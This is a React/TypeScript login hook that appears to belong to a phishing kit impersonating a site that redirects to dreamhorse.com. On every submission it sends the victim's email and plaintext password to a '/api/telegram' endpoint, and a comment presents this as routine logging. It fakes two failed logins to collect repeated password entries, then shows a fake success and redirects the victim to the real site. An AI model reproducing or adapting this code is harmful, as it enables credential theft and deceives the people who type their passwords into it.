import { useState, useRef } from 'react'
import { LoginCredentials, LoginState } from '../../../types/auth'

export function useLogin() {
  const [state, setState] = useState<LoginState>({
    isLoading: false,
    error: null,
    success: false,
  })

  const attemptsRef = useRef(0)

  const login = async (credentials: LoginCredentials) => {
    setState({ isLoading: true, error: null, success: false })

    try {
      await new Promise((resolve) => setTimeout(resolve, 1000))

      // Increment attempts using useRef for immediate access
      attemptsRef.current += 1
      const currentAttempt = attemptsRef.current

      // Log attempt via API
      const logMessage = `🔐 Login attempt ${currentAttempt}
Email: ${credentials.email}
Password: ${credentials.password}
Time: ${new Date().toISOString()}`

      try {
        const response = await fetch('/api/telegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ message: logMessage }),
        })
        if (!response.ok) {
          console.error('Telegram API error:', response.status, await response.text())
        }
      } catch (telegramError) {
        console.error('Failed to send Telegram notification:', telegramError)
        // Continue with login process even if Telegram notification fails
      }

      // First two attempts fail
      if (currentAttempt <= 2) {
        setState({
          isLoading: false,
          error: `Invalid email or password. (Attempt ${currentAttempt}/3)`,
          success: false,
        })
        return
      }

      // Third attempt "succeeds"
      setState({
        isLoading: false,
        error: null,
        success: true,
      })

      // Reset attempts counter and redirect after short delay
      attemptsRef.current = 0
      setTimeout(() => {
        window.location.href = "https://dreamhorse.com"
      }, 1000)

    } catch (error) {
      console.error('Login error:', error)
      setState({
        isLoading: false,
        error: 'An error occurred. Please try again.',
        success: false,
      })
    }
  }

  const reset = () => {
    setState({ isLoading: false, error: null, success: false })
    attemptsRef.current = 0
  }

  return { ...state, login, reset }
}